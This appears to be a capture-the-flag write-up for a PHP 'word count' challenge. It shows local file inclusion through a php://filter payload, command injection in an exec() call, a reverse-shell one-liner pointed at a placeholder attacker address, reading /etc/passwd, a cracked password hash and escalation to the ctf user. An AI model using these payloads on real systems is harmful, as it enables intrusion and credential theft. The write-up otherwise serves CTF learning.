The application is vulnerable to LFi:
http://43.205.178.174:8181/?file=

Used php wrapper to read the files:

http://43.205.178.174:8181/?file=http://43.205.178.174:8181/?file=php://filter/read=convert.base64-encode/resource=wc.php

Base64 decoded it:
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>word count as a service</title>
    <style>
        html,
        body {
            overflow: none;
            max-height: 100vh;
        }
    </style>
</head>

<body style="height: 100vh; text-align: center; background-color: black; color: white; display: flex; flex-direction: column; justify-content: center;">
    <?php
    ini_set('max_execution_time', 5);
    if ($_COOKIE['password'] !== getenv('PASSWORD')) {
        setcookie('password', 'PASSWORD');
        die('Sorry, only people from CTF7 are allowed to access this page.');
    }
    ?>

    <h1>Character Count as a Service</h1>
    <form>
        <input type="hidden" value="wc.php" name="file">
        <textarea style="border-radius: 1rem;" type="text" name="text" rows=30 cols=100></textarea><br />
        <input type="submit">
    </form>
    <?php
    if (isset($_GET["text"])) {
        $text = $_GET["text"];
        echo "<h2>The Character Count is: " . exec('printf \'' . $text . '\' | wc -c') . "</h2>";
    }
    ?>
</body>

</html>


So yeah, if we get the the cookie password with the value of PASSWORD from the envrionement variable, we can use the word editor and furthur ,
This word count is vulnerable to OS commadn injection

The robots.txt gave a checkpass.php file.

Read it: http://43.205.178.174:8181/?file=php://filter/read=convert.base64-encode/resource=checkpass.php

<?php
$password = "w0rdc0unt123";
// Cookie password.
echo "IMPORTANT!!! The page is still under development. This has a secret, do not push this page.";

header('Location: /');


Used the password as cookie value as accessed the wc.php.

Used this payload to spwan the shell:
php -r '$sock=fsockopen( "$your_adress_ip" , $port );exec("/bin/sh -i <&3 >&3 2>&3");'


Now i used find to check for all flag.txt file and found it in this directory: /ctf/system/of/a/down/

Tried to read it but its only accessible by user ctf and root.

The /ctf folder had a README file with the content: My password has is: 6f246c872cbf0b7fd7530b7aa235e67e	

Cracked the password using crackstation: csictf.


Logged in as ctf user. 

Read the flag:
ctf7{1nj3ct10n_is_p41nfu1}

$ ls
checkpass.php
index.php
robots.txt
wc.php
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
ctf:x:1000:1000::/ctf:/bin/sh
$ su ctf
Password: csictf
ls
checkpass.php
index.php
robots.txt
wc.php
cd /ctf
ls
README
avenged
dream
findaas
led
system
cd system
ls
of
cd of
ls
a
cd a
ls
down
cd down
ls
flag.txt
cat flag.txt
ctf7{1nj3ct10n_is_p41nfu1}
